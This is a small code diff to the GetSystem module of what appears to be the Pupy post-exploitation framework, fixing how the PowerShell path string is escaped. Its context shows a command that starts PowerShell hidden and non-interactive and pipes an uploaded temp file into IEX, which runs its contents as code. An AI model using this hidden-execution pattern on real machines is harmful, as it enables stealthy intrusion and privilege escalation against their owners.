@@ -105,7 +105,7 @@ class GetSystem(PupyModule):
             random_name += '.txt'
             remotefile  = ros.path.join(tempdir, random_name)
 
-            cmd     = u'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe'
+            cmd     = ur'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
             param   = u'-w hidden -noni -nop -c "cat %s | Out-String | IEX"' % remotefile
 
             cmd = '%s %s' % (cmd, param)
